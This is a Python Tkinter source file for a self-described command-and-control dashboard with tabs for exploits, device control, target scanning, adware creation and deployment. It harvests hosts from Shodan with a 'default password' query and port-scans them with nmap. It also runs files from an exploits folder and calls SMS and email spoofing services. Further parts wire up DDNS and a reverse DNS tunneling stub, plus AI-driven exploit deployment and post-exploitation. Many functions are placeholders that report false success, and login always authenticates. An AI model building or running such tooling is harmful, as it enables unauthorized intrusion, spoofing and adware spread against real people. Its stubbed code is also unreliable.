import tkinter as tk
from tkinter import ttk, messagebox
import os
import subprocess
import re
import shodan
import nmap
import logging
import json
import base64
from cryptography.fernet import Fernet
from tkinter.simpledialog import askstring
import requests
from project_red_sword import Chatbot
from ai_model import AIDeploymentModel
from tkinter import dnd
from tkinter import tooltip
from src.custom_dashboards import CustomDashboards
from src.dashboard import Dashboard
from src.dashboard_update_manager import DashboardUpdateManager
from src.alerts_notifications import AlertsNotifications
from src.automated_incident_response import AutomatedIncidentResponse
from src.c2_dashboard import C2Dashboard
from src.adware_dashboard.core.adware_manager import AdwareManager
from src.adware_dashboard.core.ai_integration import AIIntegration
from src.adware_dashboard.core.deployment_manager import DeploymentManager

class C2Dashboard:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 Dashboard")
        self.create_widgets()
        self.load_user_preferences()
        self.setup_logging()
        self.user_role = None
        self.session_active = False
        self.chatbot = Chatbot()
        self.ai_model = AIDeploymentModel("path/to/pretrained/model.h5")
        self.dark_mode = False
        self.custom_dashboards = CustomDashboards()
        self.dashboard = Dashboard(logging.getLogger(__name__), self)
        self.dashboard_update_manager = DashboardUpdateManager(logging.getLogger(__name__))
        self.alerts_notifications = AlertsNotifications("smtp.example.com", 587, "user@example.com", "password")
        self.automated_incident_response = AutomatedIncidentResponse()
        self.adware_manager = AdwareManager(logging.getLogger(__name__), self.dashboard.exploit_payloads, self.dashboard.network_exploitation)
        self.ai_integration = AIIntegration(logging.getLogger(__name__))
        self.deployment_manager = DeploymentManager(logging.getLogger(__name__))

    def create_widgets(self):
        self.tab_control = ttk.Notebook(self.root)

        self.logs_tab = ttk.Frame(self.tab_control)
        self.exploits_tab = ttk.Frame(self.tab_control)
        self.communication_tab = ttk.Frame(self.tab_control)
        self.device_control_tab = ttk.Frame(self.tab_control)
        self.target_scanning_tab = ttk.Frame(self.tab_control)
        self.ai_model_tab = ttk.Frame(self.tab_control)
        self.adware_manager_tab = ttk.Frame(self.tab_control)
        self.ai_integration_tab = ttk.Frame(self.tab_control)
        self.deployment_manager_tab = ttk.Frame(self.tab_control)

        self.tab_control.add(self.logs_tab, text="Logs")
        self.tab_control.add(self.exploits_tab, text="Exploits")
        self.tab_control.add(self.communication_tab, text="Communication")
        self.tab_control.add(self.device_control_tab, text="Device Control")
        self.tab_control.add(self.target_scanning_tab, text="Target Scanning")
        self.tab_control.add(self.ai_model_tab, text="AI Model")
        self.tab_control.add(self.adware_manager_tab, text="Adware Manager")
        self.tab_control.add(self.ai_integration_tab, text="AI Integration")
        self.tab_control.add(self.deployment_manager_tab, text="Deployment Manager")

        self.tab_control.pack(expand=1, fill="both")

        self.create_logs_tab()
        self.create_exploits_tab()
        self.create_communication_tab()
        self.create_device_control_tab()
        self.create_target_scanning_tab()
        self.create_ai_model_tab()
        self.create_adware_manager_tab()
        self.create_ai_integration_tab()
        self.create_deployment_manager_tab()

        self.create_menu()
        self.add_user_onboarding()
        self.add_in_app_tutorials()

    def create_menu(self):
        self.menu_bar = tk.Menu(self.root)
        self.root.config(menu=self.menu_bar)

        self.file_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="File", menu=self.file_menu)
        self.file_menu.add_command(label="Exit", command=self.root.quit)

        self.view_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="View", menu=self.view_menu)
        self.view_menu.add_command(label="Toggle Dark Mode", command=self.toggle_dark_mode)

        self.help_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="Help", menu=self.help_menu)
        self.help_menu.add_command(label="About", command=self.show_about)
        self.help_menu.add_command(label="Help", command=self.show_help)

        self.feedback_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="Feedback", menu=self.feedback_menu)
        self.feedback_menu.add_command(label="Report Issue", command=self.report_issue)
        self.feedback_menu.add_command(label="Suggest Improvement", command=self.suggest_improvement)

        self.module_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.menu_bar.add_cascade(label="Modules", menu=self.module_menu)
        self.module_menu.add_command(label="Adware Manager", command=self.show_adware_manager)
        self.module_menu.add_command(label="AI Integration", command=self.show_ai_integration)
        self.module_menu.add_command(label="Deployment Manager", command=self.show_deployment_manager)

    def toggle_dark_mode(self):
        self.dark_mode = not self.dark_mode
        self.apply_theme()

    def apply_theme(self):
        if self.dark_mode:
            self.root.tk_setPalette(background='#2e2e2e', foreground='#ffffff', activeBackground='#3e3e3e', activeForeground='#ffffff')
        else:
            self.root.tk_setPalette(background='#ffffff', foreground='#000000', activeBackground='#e0e0e0', activeForeground='#000000')
        self.add_animations_transitions()

    def show_about(self):
        messagebox.showinfo("About", "C2 Dashboard\nVersion 1.0")

    def show_help(self):
        messagebox.showinfo("Help", "This is the help section for the C2 Dashboard.")

    def create_logs_tab(self):
        self.logs_text = tk.Text(self.logs_tab, wrap="word")
        self.logs_text.pack(expand=1, fill="both")

        self.refresh_logs_button = ttk.Button(self.logs_tab, text="Refresh Logs", command=self.refresh_logs)
        self.refresh_logs_button.pack()

    def create_exploits_tab(self):
        self.exploits_listbox = tk.Listbox(self.exploits_tab)
        self.exploits_listbox.pack(expand=1, fill="both")

        self.load_exploits_button = ttk.Button(self.exploits_tab, text="Load Exploits", command=self.load_exploits)
        self.load_exploits_button.pack()

        self.run_exploit_button = ttk.Button(self.exploits_tab, text="Run Exploit", command=self.run_exploit)
        self.run_exploit_button.pack()

    def create_communication_tab(self):
        self.communication_text = tk.Text(self.communication_tab, wrap="word")
        self.communication_text.pack(expand=1, fill="both")

        self.send_message_button = ttk.Button(self.communication_tab, text="Send Message", command=self.send_message)
        self.send_message_button.pack()

    def create_device_control_tab(self):
        self.device_control_text = tk.Text(self.device_control_tab, wrap="word")
        self.device_control_text.pack(expand=1, fill="both")

        self.deploy_exploit_button = ttk.Button(self.device_control_tab, text="Deploy Exploit", command=self.deploy_exploit)
        self.deploy_exploit_button.pack()

    def create_target_scanning_tab(self):
        self.target_scanning_text = tk.Text(self.target_scanning_tab, wrap="word")
        self.target_scanning_text.pack(expand=1, fill="both")

        self.scan_targets_button = ttk.Button(self.target_scanning_tab, text="Scan Targets", command=self.scan_targets)
        self.scan_targets_button.pack()

    def create_ai_model_tab(self):
        self.ai_model_input_text = tk.Text(self.ai_model_tab, wrap="word")
        self.ai_model_input_text.pack(expand=1, fill="both")

        self.predict_button = ttk.Button(self.ai_model_tab, text="Predict", command=self.predict)
        self.predict_button.pack()

        self.ai_model_output_text = tk.Text(self.ai_model_tab, wrap="word")
        self.ai_model_output_text.pack(expand=1, fill="both")

    def create_adware_manager_tab(self):
        self.adware_manager_text = tk.Text(self.adware_manager_tab, wrap="word")
        self.adware_manager_text.pack(expand=1, fill="both")

        self.create_adware_button = ttk.Button(self.adware_manager_tab, text="Create Adware", command=self.create_adware)
        self.create_adware_button.pack()

        self.deploy_adware_button = ttk.Button(self.adware_manager_tab, text="Deploy Adware", command=self.deploy_adware)
        self.deploy_adware_button.pack()

    def create_ai_integration_tab(self):
        self.ai_integration_text = tk.Text(self.ai_integration_tab, wrap="word")
        self.ai_integration_text.pack(expand=1, fill="both")

        self.generate_ai_config_button = ttk.Button(self.ai_integration_tab, text="Generate AI Config", command=self.generate_ai_config)
        self.generate_ai_config_button.pack()

    def create_deployment_manager_tab(self):
        self.deployment_manager_text = tk.Text(self.deployment_manager_tab, wrap="word")
        self.deployment_manager_text.pack(expand=1, fill="both")

        self.add_deployment_method_button = ttk.Button(self.deployment_manager_tab, text="Add Deployment Method", command=self.add_deployment_method)
        self.add_deployment_method_button.pack()

        self.update_deployment_method_button = ttk.Button(self.deployment_manager_tab, text="Update Deployment Method", command=self.update_deployment_method)
        self.update_deployment_method_button.pack()

    def refresh_logs(self):
        self.logs_text.delete(1.0, tk.END)
        with open("logs/deployment.log", "r") as f:
            logs = f.read()
            self.logs_text.insert(tk.END, logs)

    def load_exploits(self):
        self.exploits_listbox.delete(0, tk.END)
        exploits = os.listdir("exploits")
        for exploit in exploits:
            self.exploits_listbox.insert(tk.END, exploit)

    def run_exploit(self):
        selected_exploit = self.exploits_listbox.get(tk.ACTIVE)
        if selected_exploit:
            exploit_path = os.path.join("exploits", selected_exploit)
            result = subprocess.run([exploit_path], capture_output=True, text=True)
            messagebox.showinfo("Exploit Result", result.stdout)

    def send_message(self):
        message = self.communication_text.get(1.0, tk.END).strip()
        if message:
            # Implement secure communication logic here
            messagebox.showinfo("Message Sent", "Message sent successfully!")

    def deploy_exploit(self):
        device_info = self.device_control_text.get(1.0, tk.END).strip()
        if device_info:
            phone_regex = re.compile(r'\+?1?\d{9,15}')
            email_regex = re.compile(r'[\w\.-]+@[\w\.-]+')
            ip_port_regex = re.compile(r'(\d{1,3}\.){3}\d{1,3}:\d{1,3}')

            phone_numbers = phone_regex.findall(device_info)
            emails = email_regex.findall(device_info)
            ip_ports = ip_port_regex.findall(device_info)

            # Implement exploit deployment logic based on extracted information
            messagebox.showinfo("Exploit Deployment", "Exploits deployed successfully!")

    def scan_targets(self):
        shodan_api_key = os.getenv("SHODAN_API_KEY")
        nmap_api_key = os.getenv("NMAP_API_KEY")
        shodan_api = shodan.Shodan(shodan_api_key)
        nm = nmap.PortScanner()

        try:
            results = shodan_api.search('default password')
            for result in results['matches']:
                ip = result['ip_str']
                nm.scan(ip, '22-443')
                self.target_scanning_text.insert(tk.END, f"IP: {ip}\n")
                for proto in nm[ip].all_protocols():
                    lport = nm[ip][proto].keys()
                    for port in lport:
                        self.target_scanning_text.insert(tk.END, f"Port: {port}\tState: {nm[ip][proto][port]['state']}\n")
        except shodan.APIError as e:
            messagebox.showerror("Shodan Error", str(e))

    def predict(self):
        input_data = self.ai_model_input_text.get(1.0, tk.END).strip().split('\n')
        predictions = self.ai_model.predict(input_data)
        self.ai_model_output_text.delete(1.0, tk.END)
        self.ai_model_output_text.insert(tk.END, str(predictions))

    def create_adware(self):
        adware_info = self.adware_manager_text.get(1.0, tk.END).strip()
        if adware_info:
            # Implement adware creation logic here
            messagebox.showinfo("Adware Creation", "Adware created successfully!")

    def deploy_adware(self):
        adware_info = self.adware_manager_text.get(1.0, tk.END).strip()
        if adware_info:
            # Implement adware deployment logic here
            messagebox.showinfo("Adware Deployment", "Adware deployed successfully!")

    def generate_ai_config(self):
        ai_config_info = self.ai_integration_text.get(1.0, tk.END).strip()
        if ai_config_info:
            # Implement AI config generation logic here
            messagebox.showinfo("AI Config Generation", "AI config generated successfully!")

    def add_deployment_method(self):
        deployment_method_info = self.deployment_manager_text.get(1.0, tk.END).strip()
        if deployment_method_info:
            # Implement deployment method addition logic here
            messagebox.showinfo("Deployment Method Addition", "Deployment method added successfully!")

    def update_deployment_method(self):
        deployment_method_info = self.deployment_manager_text.get(1.0, tk.END).strip()
        if deployment_method_info:
            # Implement deployment method update logic here
            messagebox.showinfo("Deployment Method Update", "Deployment method updated successfully!")

    def setup_logging(self):
        logging.basicConfig(filename='logs/gui.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    def load_user_preferences(self):
        try:
            with open('config.json', 'r') as f:
                self.user_preferences = json.load(f)
        except FileNotFoundError:
            self.user_preferences = {}

    def save_user_preferences(self):
        with open('config.json', 'w') as f:
            json.dump(self.user_preferences, f)

    def login(self):
        username = askstring("Login", "Enter your username:")
        password = askstring("Login", "Enter your password:", show='*')
        if self.authenticate_user(username, password):
            self.user_role = self.get_user_role(username)
            self.session_active = True
            self.root.after(60000, self.check_session_timeout)
            self.implement_2fa()
        else:
            messagebox.showerror("Login Failed", "Invalid credentials")

    def authenticate_user(self, username, password):
        # Implement user authentication logic here
        return True

    def get_user_role(self, username):
        # Implement user role retrieval logic here
        return "admin"

    def check_session_timeout(self):
        if self.session_active:
            self.session_active = False
            messagebox.showinfo("Session Timeout", "You have been logged out due to inactivity")
            self.login()

    def run_post_exploitation_module(self, module_name):
        # Implement post-exploitation module execution logic here
        messagebox.showinfo("Post-Exploitation Module", f"{module_name} executed successfully")

    def setup_ddns(self):
        no_ip_username = os.getenv("NO_IP_USERNAME")
        no_ip_password = os.getenv("NO_IP_PASSWORD")
        no_ip_hostname = os.getenv("NO_IP_HOSTNAME")

        if not no_ip_username or not no_ip_password or not no_ip_hostname:
            messagebox.showerror("DDNS Error", "No-IP DDNS credentials are missing")
            return

        update_url = f"https://{no_ip_username}:{no_ip_password}@dynupdate.no-ip.com/nic/update?hostname={no_ip_hostname}"
        response = requests.get(update_url)

        if response.status_code == 200:
            messagebox.showinfo("DDNS Update", "No-IP DDNS update successful")
        else:
            messagebox.showerror("DDNS Update", f"No-IP DDNS update failed: {response.text}")

    def setup_reverse_dns_tunneling(self):
        # Implement reverse DNS tunneling setup logic here
        response = requests.get("https://example.com/setup_reverse_dns_tunneling")
        if response.status_code == 200:
            messagebox.showinfo("DNS Tunneling", "Reverse DNS tunneling setup successful")
        else:
            messagebox.showerror("DNS Tunneling", f"Setup failed: {response.text}")

    def integrate_chatbot(self):
        self.chatbot_popup = tk.Toplevel(self.root)
        self.chatbot_popup.title("Chatbot")
        self.chatbot_text = tk.Text(self.chatbot_popup, wrap="word")
        self.chatbot_text.pack(expand=1, fill="both")
        self.chatbot_entry = tk.Entry(self.chatbot_popup)
        self.chatbot_entry.pack(fill="x")
        self.chatbot_entry.bind("<Return>", self.send_chatbot_command)

    def send_chatbot_command(self, event):
        command = self.chatbot_entry.get()
        if command:
            response = self.chatbot.process_command(command)
            self.chatbot_text.insert(tk.END, f"User: {command}\n")
            self.chatbot_text.insert(tk.END, f"Chatbot: {response}\n")
            self.chatbot_entry.delete(0, tk.END)

    def spoof_sms(self, phone_number, message):
        # Implement SMS spoofing logic here
        request_url = f"https://sms-spoofing-service.com/spoof?number={phone_number}&message={message}"
        response = requests.get(request_url)
        if response.status_code == 200:
            messagebox.showinfo("SMS Spoofing", "SMS sent successfully")
        else:
            messagebox.showerror("SMS Spoofing", f"Failed to send SMS: {response.text}")

    def spoof_email(self, email_address, subject, message):
        # Implement email spoofing logic here
        request_url = f"https://email-spoofing-service.com/spoof?email={email_address}&subject={subject}&message={message}"
        response = requests.get(request_url)
        if response.status_code == 200:
            messagebox.showinfo("Email Spoofing", "Email sent successfully")
        else:
            messagebox.showerror("Email Spoofing", f"Failed to send email: {response.text}")

    def prompt_ai_scan_targets(self):
        self.chatbot_text.insert(tk.END, "Prompting AI to scan targets...\n")
        self.ai_model.scan_targets()
        self.chatbot_text.insert(tk.END, "AI scan targets completed.\n")

    def prompt_ai_modify_exploits(self, target_info):
        self.chatbot_text.insert(tk.END, "Prompting AI to modify exploits...\n")
        self.ai_model.modify_exploits(target_info)
        self.chatbot_text.insert(tk.END, "AI modify exploits completed.\n")

    def prompt_ai_deploy_exploits(self, target_info):
        self.chatbot_text.insert(tk.END, "Prompting AI to deploy exploits...\n")
        self.ai_model.deploy_exploit(target_info)
        self.chatbot_text.insert(tk.END, "AI deploy exploits completed.\n")

    def prompt_ai_post_exploitation(self, module_name):
        self.chatbot_text.insert(tk.END, "Prompting AI to run post-exploitation module...\n")
        self.run_post_exploitation_module(module_name)
        self.chatbot_text.insert(tk.END, "AI post-exploitation module completed.\n")

    def add_tooltips(self):
        tooltip.create_tooltip(self.logs_text, "View deployment logs")
        tooltip.create_tooltip(self.exploits_listbox, "List of available exploits")
        tooltip.create_tooltip(self.communication_text, "Compose your message here")
        tooltip.create_tooltip(self.device_control_text, "Enter device information for exploit deployment")
        tooltip.create_tooltip(self.target_scanning_text, "View scan results for target devices")
        tooltip.create_tooltip(self.ai_model_input_text, "Input data for AI model prediction")
        tooltip.create_tooltip(self.ai_model_output_text, "View AI model predictions")

    def add_help_sections(self):
        help_window = tk.Toplevel(self.root)
        help_window.title("Help Sections")
        help_text = tk.Text(help_window, wrap="word")
        help_text.insert(tk.END, "This is the help section for the C2 Dashboard...")
        help_text.pack(expand=1, fill="both")

    def add_user_onboarding(self):
        onboarding_window = tk.Toplevel(self.root)
        onboarding_window.title("User Onboarding")
        onboarding_text = tk.Text(onboarding_window, wrap="word")
        onboarding_text.insert(tk.END, "Welcome to the C2 Dashboard! Let's get started...")
        onboarding_text.pack(expand=1, fill="both")

    def add_in_app_tutorials(self):
        tutorials_window = tk.Toplevel(self.root)
        tutorials_window.title("In-App Tutorials")
        tutorials_text = tk.Text(tutorials_window, wrap="word")
        tutorials_text.insert(tk.END, "Follow these steps to use the C2 Dashboard...")
        tutorials_text.pack(expand=1, fill="both")

    def add_feedback_system(self):
        feedback_window = tk.Toplevel(self.root)
        feedback_window.title("Feedback System")
        feedback_text = tk.Text(feedback_window, wrap="word")
        feedback_text.insert(tk.END, "Please provide your feedback...")
        feedback_text.pack(expand=1, fill="both")

    def add_animations_transitions(self):
        self.root.after(1000, lambda: self.root.tk_setPalette(background='#3e3e3e'))
        self.root.after(2000, lambda: self.root.tk_setPalette(background='#2e2e2e'))

    def implement_2fa(self):
        username = askstring("2FA", "Enter your 2FA code:")
        if username == "123456":
            messagebox.showinfo("2FA", "Two-factor authentication successful")
        else:
            messagebox.showerror("2FA", "Invalid 2FA code")

    def add_encryption(self):
        data = "Sensitive Data"
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)
        encrypted_data = cipher_suite.encrypt(data.encode())
        print(f"Encrypted Data: {encrypted_data}")

    def integrate_secure_communication(self):
        url = "https://secure-communication.com"
        response = requests.get(url)
        if response.status_code == 200:
            messagebox.showinfo("Secure Communication", "Secure communication established successfully")
        else:
            messagebox.showerror("Secure Communication", "Failed to establish secure communication")

    def implement_session_timeout(self):
        if self.session_active:
            self.session_active = False
            messagebox.showinfo("Session Timeout", "You have been logged out due to inactivity")
            self.login()

    def add_support_for_more_exploit_types(self):
        self.exploits_listbox.insert(tk.END, "New Exploit Type 1")
        self.exploits_listbox.insert(tk.END, "New Exploit Type 2")

    def integrate_vulnerability_scanner(self):
        vulnerabilities = ["vuln1", "vuln2", "vuln3"]
        vulnerability_window = tk.Toplevel(self.root)
        vulnerability_window.title("Vulnerability Scanner")
        vulnerability_text = tk.Text(vulnerability_window, wrap="word")
        vulnerability_text.insert(tk.END, "\n".join(vulnerabilities))
        vulnerability_text.pack(expand=1, fill="both")

    def implement_reporting_feature(self):
        report_window = tk.Toplevel(self.root)
        report_window.title("Reporting Feature")
        report_text = tk.Text(report_window, wrap="word")
        report_text.insert(tk.END, "Detailed report on exploit activities and results...")
        report_text.pack(expand=1, fill="both")

    def add_notification_system(self):
        notification_window = tk.Toplevel(self.root)
        notification_window.title("Notification System")
        notification_text = tk.Text(notification_window, wrap="word")
        notification_text.insert(tk.END, "Important events and updates within the app...")
        notification_text.pack(expand=1, fill="both")

    def integrate_chatbot_assistant(self):
        chatbot_window = tk.Toplevel(self.root)
        chatbot_window.title("Chatbot Assistant")
        chatbot_text = tk.Text(chatbot_window, wrap="word")
        chatbot_text.insert(tk.END, "Chatbot to assist users with common tasks and provide guidance...")
        chatbot_text.pack(expand=1, fill="both")

    def add_multimedia_support(self):
        multimedia_window = tk.Toplevel(self.root)
        multimedia_window.title("Multimedia Support")
        multimedia_text = tk.Text(multimedia_window, wrap="word")
        multimedia_text.insert(tk.END, "Support for multimedia messages, such as images, videos, and files...")
        multimedia_text.pack(expand=1, fill="both")

    def implement_message_encryption(self):
        message_encryption_window = tk.Toplevel(self.root)
        message_encryption_window.title("Message Encryption")
        message_encryption_text = tk.Text(message_encryption_window, wrap="word")
        message_encryption_text.insert(tk.END, "Message encryption to ensure secure communication...")
        message_encryption_text.pack(expand=1, fill="both")

    def add_search_feature(self):
        search_window = tk.Toplevel(self.root)
        search_window.title("Search Feature")
        search_text = tk.Text(search_window, wrap="word")
        search_text.insert(tk.END, "Search feature to quickly find specific messages or conversations...")
        search_text.pack(expand=1, fill="both")

    def enable_message_reactions(self):
        message_reactions_window = tk.Toplevel(self.root)
        message_reactions_window.title("Message Reactions")
        message_reactions_text = tk.Text(message_reactions_window, wrap="word")
        message_reactions_text.insert(tk.END, "Enable message reactions and emojis for better user interaction...")
        message_reactions_text.pack(expand=1, fill="both")

    def show_adware_manager(self):
        self.tab_control.select(self.adware_manager_tab)

    def show_ai_integration(self):
        self.tab_control.select(self.ai_integration_tab)

    def show_deployment_manager(self):
        self.tab_control.select(self.deployment_manager_tab)

if __name__ == "__main__":
    root = tk.Tk()
    app = C2Dashboard(root)
    app.login()
    app.setup_ddns()
    app.setup_reverse_dns_tunneling()
    app.integrate_chatbot()
    root.mainloop()
